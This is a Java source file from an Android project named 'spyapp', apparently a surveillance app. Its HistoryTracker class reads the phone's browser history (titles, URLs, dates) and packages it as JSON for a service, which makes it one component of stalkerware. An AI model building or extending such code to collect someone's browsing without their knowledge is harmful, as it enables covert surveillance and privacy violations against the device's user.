package com.example.spyapp.util;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.example.spyapp.Services;

import android.content.Context;
import android.database.Cursor;
import android.provider.Browser;
import android.util.Log;


public class HistoryTracker {

	Context context;
	
	
	static HistoryTracker object=new HistoryTracker();
	
	public static HistoryTracker getInstance(){
		return object;
	}
	
	 public JSONArray getBrowserHistory(Context context_) {
		 
		 	if(context==null){
		 		this.context=context_;
		 	}
		 	
		 	JSONArray jsonArray=new JSONArray();
	        String[] proj = new String[] {
	        		Browser.BookmarkColumns._ID,
	                Browser.BookmarkColumns.TITLE,
	                Browser.BookmarkColumns.URL,
	                Browser.BookmarkColumns.DATE
	        };
	        String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
	                                                                // 1 = bookmark
	        Cursor mCur = context.getContentResolver().query(Browser.BOOKMARKS_URI, proj,
	                sel, null, null);
	        mCur.moveToFirst();

	        if (mCur.getCount() > 0) {
	            boolean cont = true;
	            while (mCur.isAfterLast() == false && cont) {
	            	long id = mCur.getLong(mCur
	                        .getColumnIndex(Browser.BookmarkColumns._ID));
	               String title = mCur.getString(mCur
	                        .getColumnIndex(Browser.BookmarkColumns.TITLE));
	               String url = mCur.getString(mCur
	                        .getColumnIndex(Browser.BookmarkColumns.URL));
	               int d_=mCur
	                        .getColumnIndex(Browser.BookmarkColumns.DATE);
	               long date = mCur.getLong(d_);


	               Date _date=new Date(date);
	               SimpleDateFormat df2 = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");
	               String dateText = df2.format(_date);
	               
	                Log.d("guang", title + ":" + url);
	                
	                JSONObject jsonObj = new JSONObject();
					try {
						jsonObj.put("_id", id);
						jsonObj.put("web_title", title);
						jsonObj.put("web_url", url);
						jsonObj.put("web_date", dateText);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

                    if (!title.equals("") && !url.equals("")) {
                    	jsonArray.put(jsonObj);
                    }
	                mCur.moveToNext();
	                
	                if(mCur.isAfterLast()){
	                	System.out.println("this is last "+url);
	                }
	            }
	        }

	        mCur.close();
	        return jsonArray;
	    }

	 
	 
	 public JSONObject getLastVisitedBrowserHistory(Services context_) {
		 
		 	if(context==null){
		 		this.context=context_;
		 	}
		 	
		 	JSONObject jsonObj = new JSONObject();
	        String[] proj = new String[] {
	        		Browser.BookmarkColumns._ID,
	                Browser.BookmarkColumns.TITLE,
	                Browser.BookmarkColumns.URL,
	                Browser.BookmarkColumns.DATE
	        };
	        String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
	                                                       // 1 = bookmark
	        Cursor mCur = context.getContentResolver().query(Browser.BOOKMARKS_URI, proj,
	                sel, null, null);
	        mCur.moveToLast();
	        if (mCur.getCount() > 0) {
	               String title = mCur.getString(mCur
	                        .getColumnIndex(Browser.BookmarkColumns.TITLE));
	               String url = mCur.getString(mCur
	                        .getColumnIndex(Browser.BookmarkColumns.URL));
	               long id = mCur.getLong(mCur
	                        .getColumnIndex(Browser.BookmarkColumns._ID));
	               long date = mCur.getLong(mCur
	                        .getColumnIndex(Browser.BookmarkColumns.DATE));

	                Log.d("guang", title + ":" + url);
	                
	                
					try {
						jsonObj.put("_id", id);
						jsonObj.put("name", title);
						jsonObj.put("web_url", url);
						jsonObj.put("web_date", date);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

                 
	           }

	        mCur.close();
	        return jsonObj;
	    }
}
